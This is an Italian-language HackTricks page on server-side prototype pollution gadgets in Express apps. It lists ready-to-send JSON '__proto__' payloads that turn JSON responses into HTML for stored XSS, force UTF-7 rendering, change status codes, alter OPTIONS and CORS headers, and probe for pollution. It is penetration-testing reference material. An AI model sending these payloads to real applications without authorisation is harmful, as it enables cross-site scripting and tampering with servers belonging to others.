# Gadget di Prototype Pollution di Express

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Servi risposte XSS

**Per ulteriori dettagli [dai un'occhiata alla ricerca originale](https://portswigger.net/research/server-side-prototype-pollution)**

### Cambia il tipo di contenuto JSON in HTML

In un'app Express che utilizza una **risposta di tipo contenuto JSON** e riflette un JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
In questi casi, di solito non √® possibile eseguire XSS con un tipo di contenuto JSON. Tuttavia, con la pollution del prototipo possiamo **confondere Express per servire una risposta HTML**. Questa vulnerabilit√† si basa sull'applicazione che utilizza **`res.send(obj)`** e utilizza il body parser con il tipo di contenuto application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Attraverso la **manipolazione** delle propriet√† **`body`** e **`_body`**, √® possibile causare a **Express di servire il tipo di contenuto HTML** e riflettere la propriet√† `_body`, risultando in un XSS memorizzato.

### Renderizzare UTF7

√à possibile fare in modo che Express **renderizzi contenuti UTF-7 con**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Tecniche di scansione sicure

### Spazi JSON

Il seguente PP far√† s√¨ che gli attributi all'interno di un JSON abbiano uno spazio extra che non comprometter√† la funzionalit√†:
```json
{"__proto__":{"json spaces": " "}}
```
Quindi un JSON riflesso avr√† questo aspetto:
```json
{"foo":  "bar"} -- Note the extra space
```
### Intestazioni Esposte

Il seguente gadget PP far√† s√¨ che il server invii l'intestazione HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
√à necessario avere installato il modulo **CORS**

### **Metodo OPTIONS**

Con il seguente payload, √® possibile **nascondere un metodo da una risposta OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Stato**

√à possibile cambiare il **codice di stato restituito** utilizzando il seguente payload PP:
```json
{"__proto__":{"status":510}}
```
### Errore

Quando si assegna un prototipo con un tipo primitivo come una stringa, viene prodotta un'operazione **no-op poich√© il prototipo deve essere un oggetto**. Se si tenta di assegnare un oggetto prototipo all'oggetto `Object.prototype` stesso, ci√≤ causer√† **un'eccezione**. Possiamo utilizzare questi due comportamenti per **rilevare se la contaminazione del prototipo √® stata effettuata con successo**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valore Riflesso

Quando un'applicazione include un oggetto nella sua risposta, creare un attributo con un **nome insolito insieme a `__proto__`** pu√≤ essere illuminante. In particolare, se nella risposta viene restituito **solo l'attributo insolito**, ci√≤ potrebbe indicare una vulnerabilit√† dell'applicazione:
```json
{"unusualName":"value","__proto__":"test"}
```
Inoltre, in scenari in cui viene utilizzata una libreria come Lodash, impostare una propriet√† sia tramite la pollution del prototipo (PP) che direttamente all'interno dell'oggetto offre un altro approccio diagnostico. Se tale propriet√† viene omessa dalla risposta, ci√≤ suggerisce che Lodash sta verificando l'esistenza della propriet√† nell'oggetto di destinazione prima di effettuare la fusione:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Misc

### Consenti punti

C'√® un'opzione in Express che ti permette di **creare oggetti dai parametri della stringa di query**.\
Potresti sicuramente usarla in una **catena** di bug per sfruttare una **vulnerabilit√† di pollution del prototipo**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` crea un oggetto in Node.**

## Riferimenti

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
